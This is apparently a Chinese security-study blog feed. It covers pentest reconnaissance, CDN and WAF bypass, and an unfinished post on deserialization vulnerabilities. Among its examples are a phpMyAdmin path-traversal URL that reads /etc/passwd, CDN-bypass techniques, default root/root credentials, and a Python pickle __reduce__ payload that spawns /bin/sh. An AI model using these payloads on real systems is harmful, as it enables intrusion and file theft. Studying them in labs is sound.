docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1623123783733-3cba9200-6e65-4115-b589-0b777315382c.png" alt="img"></p><p>成功访问phpmyadmin之后，访问<code>http://10.1.1.133:8080/?target=db_sql.php%3f/../../../../../../../../etc/passwd</code>实现漏洞利用，得到执行etc&#x2F;passwd的结果：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623123853171-a2f0af6d-42bd-483d-a96e-02c553f0f297.png" alt="image.png"></p></li></ul><h2 id="6-加密编码算法"><a href="#6-加密编码算法" class="headerlink" title="6. 加密编码算法"></a>6. 加密编码算法</h2><ul><li><p>时间戳</p><p>在线转换工具：<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p></li><li><p>URL编码</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725211231394.png" alt="image-20220725211231394"></p></li><li><p>base64编码</p><p>随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号。</p></li><li><p>unescape编码</p><p>和URL编码有点像，特点是一般是%U+四个数字对应着两个字符，主要运用于网站web应用。</p></li><li><p>AES加密</p></li></ul><h2 id="7-x3D-x3D-CDN绕过-x3D-x3D"><a href="#7-x3D-x3D-CDN绕过-x3D-x3D" class="headerlink" title="7. &#x3D;&#x3D;CDN绕过&#x3D;&#x3D;"></a>7. &#x3D;&#x3D;CDN绕过&#x3D;&#x3D;</h2><p>CDN依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><ul><li><p>判断是否存在CDN服务</p><p>利用多节点技术进行请求返回判断<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p><p>验证获取到ip是否可信可以采用第三方的ip地址查询工具经行验证。</p><p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p>cdn网站</p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p></li><li><p>CDN对安全测试的影响</p><p>CDN会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但CDN站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</p></li><li><p>目前常见的CDN绕过技术</p><p><strong>子域名查询</strong></p><p>因为有些主站是做了CDN服务而子站是没有做CDN服务</p><p><strong>邮件服务查询</strong></p><p>因为邮箱大部分都是内部人在访问、而且访问的量也不是很大，一般是没有做CDN。</p><p><strong>国外地址请求</strong></p><p>因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。</p><p><strong>遗留文件、扫描全网</strong></p><p>如PHPinfo信息当中会遗留出ip地址</p><p><strong>黑暗引擎搜索</strong></p><p>fofa、傻蛋、谛听、zoomeye、censys</p><p><strong>特定文件dns历史记录，以量打量</strong></p><p>CDN真实IP地址获取后绑定指向地址，即更改本地HOSTS解析指向文件</p><p><strong>奇淫技巧</strong></p><p>fackcdn、w8fuckcdn、zmap</p><p><strong>借助漏洞</strong></p><p>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</p></li></ul><h2 id="8-信息收集、WAF"><a href="#8-信息收集、WAF" class="headerlink" title="8. 信息收集、WAF"></a>8. 信息收集、WAF</h2><h3 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h3><ul><li><p>目录型站点</p><p>主站上面存在其他的cms程序。</p><p>比如学生网站<a href="http://www.xxx.com的上面通过后台扫描探针发现有一个bbs的目录，一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs。我们把这个称为目录型网站，可以有两种找到漏洞的思路，一个是主站的漏洞另外的一个是bbs上面的漏洞。">www.xxx.com的上面通过后台扫描探针发现有一个bbs的目录，一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs。我们把这个称为目录型网站，可以有两种找到漏洞的思路，一个是主站的漏洞另外的一个是bbs上面的漏洞。</a></p></li><li><p>端口类站点</p><p>有的站点不是使用的是默认的站点80而是其他的端口，可以使用shodan这种工具去收集端口。</p></li><li><p>子域名站点</p><p>比如bbs.goodlift.net是goodlift.net的子域名，且为不同的站点。</p><p>现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</p></li><li><p>类似域名站点</p><p>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息。</p></li><li><p>旁注，c段站点</p><p><strong>旁注</strong>：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。</p><p><strong>C段</strong>：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段，最终拿下服务器，然后通过内网渗透的方式拿下渗透服务器。</p><p>查询服务器上站点：在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p></li><li><p>搭建软件特征站点</p><p>有的网站是借助于第三方的集成搭建工具实现，例如：PHPstudy、宝塔等环境。这样的集成环境搭建的危害就是泄露了详细的版本信息。</p><p>phpstudy搭建了之后，在默认的站点安装了phpmyadmin。有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入。</p></li></ul><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><p><strong>识别WAF的存在</strong>：直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问，针对不同的厂商的waf可能存在着不同的绕过思路。</p><ul><li><p>采用工具wafwoof，缺点是并不特别准确</p><p>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">unzip wafw00f-master.zip      <span class="comment"># 解压</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python3.8 setup.py install    <span class="comment"># 安装</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> -ld wafw00f</span></span><br><span class="line">drwxr-xr-x 6 root root 4096  6月 10 17:22 wafw00f</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> wafw00f</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python main.py https://www.hlszsb.com/   <span class="comment"># 识别网站https://www.hlszsb.com/</span></span></span><br><span class="line"></span><br><span class="line">[*] Checking https://www.hlszsb.com/</span><br><span class="line">[+] Generic Detection results:</span><br><span class="line">[-] No WAF detected by the generic detection</span><br><span class="line">[~] Number of requests: 7</span><br></pre></td></tr></table></figure></li><li><p>identYwaf</p><p>参考地址：<a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p><p>与wafwoof相比运行速度慢，但是比较稳定</p></li><li><p>在有些网站的请求信息当中留下了waf的相关信息</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725213558764.png" alt="image-20220725213558764"></p></li><li><p>nmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script==http-waf-fingerprint</span><br><span class="line">nmap --script=http-waf-detect</span><br></pre></td></tr></table></figure></li></ul><h2 id="7-资产收集"><a href="#7-资产收集" class="headerlink" title="7. 资产收集"></a>7. 资产收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Github监控</span><br><span class="line">  便于收集整理最新exp或poc</span><br><span class="line">  便于发现相关测试目标的资产</span><br><span class="line">  server酱：http://sc.ftqq.com/3.version</span><br><span class="line">  GitHub项目监控地址：https://github.com/weixiao9188/wechat_push</span><br><span class="line"></span><br><span class="line"># 各种子域名查询</span><br><span class="line"># DNS,备案,证书</span><br><span class="line"># 全球节点请求cdn</span><br><span class="line">  枚举爆破或解析子域名对应</span><br><span class="line">  便于发现管理员相关的注册信息</span><br><span class="line"></span><br><span class="line">#黑暗引擎相关搜索</span><br><span class="line">fofa, shodan, zoomeye</span><br><span class="line">  </span><br><span class="line">#微信公众号接口获取</span><br><span class="line"># 内部群内部资源</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623572333231-e96bd343-8744-4813-97f1-b8de7edc3eb7.png?x-oss-process=image/resize,w_720,limit_0" alt="image.png"></p><h2 id="8-web漏洞"><a href="#8-web漏洞" class="headerlink" title="8. web漏洞"></a>8. web漏洞</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725233424804.png" alt="image-20220725233424804"></p><p><strong>漏洞危害情况</strong></p><ol><li><p>获取网站的数据库的权限（数据），后台账号和密码—SQL注入</p></li><li><p>直接获取网站权限—文件上传</p></li></ol><p><strong>漏洞等级划分</strong></p><ol><li><p>高危：文件上传、SQL注入、代码执行、文件包含、未授权访问</p></li><li><p>中危：逻辑安全、目录遍历</p></li><li><p>低危：信息泄露—源码、部分账号密码</p></li></ol><p><strong>漏洞重点内容</strong></p><ol><li><p>CTF：SQL注入、反序列化、代码执行</p></li><li><p>SRC：以上都有，逻辑安全</p></li><li><p>红蓝对抗：高危漏洞—权限</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础概念与信息收集&quot;&gt;&lt;a href=&quot;#基础概念与信息收集&quot; class=&quot;headerlink&quot; title=&quot;基础概念与信息收集&quot;&gt;&lt;/a&gt;基础概念与信息收集&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/20</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="https://frankcao3.github.io/posts/58219"/>
    <id>https://frankcao3.github.io/posts/58219</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.974Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>参考：<a href="https://www.anquanke.com/post/id/224769">https://www.anquanke.com/post/id/224769</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p><strong>序列化</strong> ：</p><p>概念：将对象转换成字节序列（json&#x2F;xml文件）。</p><p>作用：在传递和保存对象时，序列化可以保证对象的完整性和可传递性。对象被转换为有序字节序列，以便在网络上传输或者保存在本地文件中。</p></li><li><p><strong>反序列化</strong>：</p><p>概念：将字节序列（json&#x2F;xml文件）转换成对象。</p><p>作用：根据字节序列中保存的对象状态及描述信息，通过反序列化重建对象。</p></li></ul><h2 id="序列化的优点"><a href="#序列化的优点" class="headerlink" title="序列化的优点"></a>序列化的优点</h2><p>将对象转为字节流存储到硬盘上，当 JVM （java虚拟机）停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间（永久性保存对象）。</p><p>序列化为字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输。</p><p>通过序列化可以在进程间传递对象。</p><h2 id="序列化的实现"><a href="#序列化的实现" class="headerlink" title="序列化的实现"></a>序列化的实现</h2><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>Java中，只有实现了 <strong>Serializable</strong> 或者 <strong>Externalizable</strong> 接口的类的对象才能被序列化为字节序列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">java.io.ObjectOutputStream：对象输出流。</span><br><span class="line">该类的writeObject(Object obj)方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">java.io.ObjectInputStream：对象输入流。</span><br><span class="line">该类的readObject()方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.out&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);  <span class="comment">// 将序列化的输出定向到fos</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;lihao&quot;</span>, <span class="string">&quot;wjwlh&quot;</span>, <span class="string">&quot;21&quot;</span>);</span><br><span class="line">            oos.writeObject(student1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.out&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">            <span class="type">Student</span> <span class="variable">student2</span> <span class="operator">=</span> (Student) ois.readObject();</span><br><span class="line">            System.out.println(student2.getUserName()+ <span class="string">&quot; &quot;</span> +</span><br><span class="line">                    student2.getPassword() + <span class="string">&quot; &quot;</span> + student2.getYear());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外java还有其他序列化实现方式，比如 <strong>json</strong>、&#x3D;&#x3D;<strong>fastjson</strong>&#x3D;&#x3D;、<strong>ProtoBuff</strong>、<strong>Hessian</strong>、<strong>Kyro</strong>等。</p><p>参考：<a href="https://blog.csdn.net/m0_46201444/article/details/115081351%E3%80%82">https://blog.csdn.net/m0_46201444/article/details/115081351。</a></p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>php中，序列化和反序列化对应的函数分别为 <strong>serialize()</strong> 和 **unserialize()**。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sites</span>=<span class="keyword">array</span>(<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Like&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>));    <span class="comment">// 对数组进行序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;xiaocui&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$M</span> = <span class="title function_ invoke__">newman</span>();  <span class="comment">//创建一个对象</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$M</span>));        <span class="comment">// 对对象进行序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>数组的序列化</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;a:3:&#123;i:0;s:1:&quot;I&quot;;i:1;s:4:&quot;Like&quot;;i:2;s:3:&quot;PHP&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">a:3 a代表一数组，3代表数组中有3个元素</span><br><span class="line">i:0 代表元素的下标值为0</span><br><span class="line">s:1 代表元素的数据类型为字符型,长度为1</span><br></pre></td></tr></table></figure><p><strong>对象的序列化</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;xiaocui&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:8:&quot;manage&quot;;i:26;&#125;&quot;</span><br><span class="line"></span><br><span class="line">O:3 代表是一个对象，其类名的长度为3</span><br><span class="line">3 代表类中的字段数</span><br><span class="line">s:4 代表属性的类型为字符型，长度为4</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><p>数组的序列化和反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $stu=[&#x27;tom&#x27;, &#x27;berry&#x27;, &#x27;ketty&#x27;];</span><br><span class="line">    $str=serialize($stu); // 序列化</span><br><span class="line">    file_put_contents(&#x27;./stu.txt&#x27;, $str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122702017.png" alt="image-20220805122702017" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // 数组的反序列化</span><br><span class="line">    $str=file_get_contents(&#x27;./stu.txt&#x27;);</span><br><span class="line">    $stu=unserialize($str);</span><br><span class="line">    print_r($stu);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122807404.png" alt="image-20220805122807404"></p><p>对象的序列化和反序列化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Student &#123;</span><br><span class="line">        public $name;</span><br><span class="line">        protected $sex;</span><br><span class="line">        private $add;</span><br><span class="line">        public function __construct($name, $sex, $add)&#123;</span><br><span class="line">            $this-&gt;name=$name;</span><br><span class="line">            $this-&gt;sex=$sex;</span><br><span class="line">            $this-&gt;add=$add;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 测试</span><br><span class="line">    $stu=new Student(&#x27;tom&#x27;, &#x27;男&#x27;, &#x27;北京&#x27;);</span><br><span class="line">    // 序列化</span><br><span class="line">    $str=serialize($stu);</span><br><span class="line">    file_put_contents(&#x27;./stu.txt&#x27;, $str);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122910666.png" alt="image-20220805122910666" style="zoom:55%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 反序列化</span><br><span class="line">    $str=file_get_contents(&#x27;./stu.txt&#x27;);</span><br><span class="line">    $stu=unserialize($str);</span><br><span class="line">    var_dump($stu);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805123011403.png" alt="image-20220805123011403"></p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>Python中序列化一般有两种方式: <code>pickle</code>模块和<code>json</code>模块, 前者是<code>Python</code>特有的格式, 后者是<code>json</code>通用的格式.</p><p><code>pickle</code>有如下四种操作方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dump对象序列化到文件对象并存入文件</span><br><span class="line">dumps对象序列化为 bytes 对象</span><br><span class="line">load对象反序列化并从文件中读取数据</span><br><span class="line">loads从 bytes 对象反序列化</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self, name=<span class="string">&#x27;h3rmesk1t&#x27;</span></span>):</span><br><span class="line">self.name = name</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo()))</span><br><span class="line"><span class="comment"># 序列化输出为b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\th3rmesk1t\x94sb.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(pickle.dumps(Demo())).name)</span><br><span class="line"><span class="comment"># 反序列化输出为 h3rmesk1t</span></span><br></pre></td></tr></table></figure><p><strong>python反序列化漏洞原理：</strong></p><p>python反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。类似于PHP中的<code>__wakeup()</code>方法。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))   <span class="comment"># 反序列化创建对象时调用__reduce__，执行恶意代码</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>序列化或反序列化的过程中会<strong>自动调用</strong>一些魔术方法。</p><p><strong>php 中 magic函数命名是以符号“__”开头的</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__construct：当一个对象创建时调用（constructor）</span><br><span class="line"></span><br><span class="line">__destruct：当一个对象被销毁时调用（destructor）</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()：当把一个类当作函数使用时自动调用</span><br><span class="line"></span><br><span class="line">__toString：当一个对象被当作一个字符串处理时自动调用</span><br><span class="line"></span><br><span class="line">__sleep：在使用<span class="title function_ invoke__">serialize</span>()函数时，程序会检查类中是否存在一个<span class="title function_ invoke__">__sleep</span>()魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。</span><br><span class="line"></span><br><span class="line">__wakeup：在使用<span class="title function_ invoke__">unserialize</span>()时，会检查是否存在一个<span class="title function_ invoke__">__wakeup</span>()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()：在对象中调用一个不存在或者不可访问方法时，__call会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()：给不可访问属性赋值时，__set会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()：对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时，<span class="title function_ invoke__">__isset</span>()会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()：对不可访问属性调用<span class="keyword">unset</span>()时，<span class="title function_ invoke__">__unset</span>()会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()：读取不可访问属性的值时，__get会被调用。</span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。</p><p>PHP反序列化漏洞的形成的根本原因是<strong>程序没有对用户输入的序列化字符串进行检测，导致反序列化过程可以被恶意控制（执行魔术方法），进而造成代码执行（XSS等）、getshell等一系列不可控的后果</strong>。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p><p>Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些<strong>自定义数据</strong>，进而在反序列化的时候能够使用 readObject 进行读取。如果用户自定义了一些恶意数据在序列化字符串中，在反序列化为对象时，其中的变量被用于命令执行等操作，就会造成反序列化漏洞。</p><p><strong>注意</strong>：<em>反序列化对象时，不会调用对象的构造函数，因为是反序列化得来的。但是在程序结束时会调用对象的析构函数。</em></p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" 